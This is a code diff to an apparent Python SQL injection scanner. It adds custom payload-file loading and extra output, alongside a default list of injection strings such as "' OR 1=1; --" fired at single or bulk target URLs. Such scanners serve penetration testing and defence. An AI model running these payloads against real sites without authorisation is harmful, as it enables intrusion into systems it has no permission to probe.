@@ -51,12 +51,12 @@ def is_vulnerable(response):
     for db_type, error_list in errors.items():
         for error in error_list:
             if error in content:
-                print(Fore.GREEN + f"[!] Potential SQL Injection vulnerability detected: {error} ({db_type})")
+                print(Fore.GREEN + f"[!] Potential SQL Injection vulnerability detected: {error} ({db_type})\n\n")
                 return True
     return False
 
 # Function to scan a URL for SQL injection vulnerabilities and detect WAF
-def scan(url):
+def scan(url, cpayload):
     """Scan the URL for SQL injection vulnerabilities and detect WAF behavior."""
     payloads = [
         "'", "''", "' OR 1=1; --", "' OR '1'='1", "' or", "-- or", "' OR '1",
@@ -90,6 +90,13 @@ def scan(url):
         "User-Agent": "Mozilla/5.0"
     }
 
+    try:
+        with open(cpayload, "r") as file:
+            payloads = file.read().splitlines()
+    except FileNotFoundError:
+        print(Fore.MAGENTA + "[+] Using default payload")
+
+
     print(Fore.YELLOW + f"[*] Starting SQL Injection scan for: {url}")
     vulnerable = False
 
@@ -112,6 +119,7 @@ def scan(url):
 
                 # Check for SQL Injection
                 if is_vulnerable(response):
+                    print(Fore.BLUE + f"url: {full_url}]")
                     print(Fore.GREEN + f"[+] SQL Injection Found with payload[{payload}]\n")
                     vulnerable = True
                 else:
@@ -132,13 +140,15 @@ def scan(url):
 if __name__ == "__main__":
     try:
         choice = input(Fore.CYAN + "[*] Choose scan type (1 for single URL, 2 for URLs from file): ")
+        cpayload = input(Fore.CYAN + "[*] Enter path payload (ENTER for default): ")
+
 
         if choice == "1":
             url = input(Fore.CYAN + "[*] Enter the target URL (e.g., http://example.com/page.php?id=): ")
             if not url.startswith("http://") and not url.startswith("https://"):
                 print(Fore.RED + "[!] Invalid URL. Ensure it starts with http:// or https://")
             else:
-                scan(url)
+                scan(url, cpayload)
         
         elif choice == "2":
             file_path = input(Fore.CYAN + "[*] Enter the path to the URLs file (e.g., urls.txt): ")
@@ -148,7 +158,7 @@ if __name__ == "__main__":
                     for url in urls:
                         url = url.strip()
                         if url.startswith("http://") or url.startswith("https://"):
-                            scan(url)
+                            scan(url, cpayload)
                         else:
                             print(Fore.RED + f"[!] Skipping invalid URL: {url}")
             except FileNotFoundError:
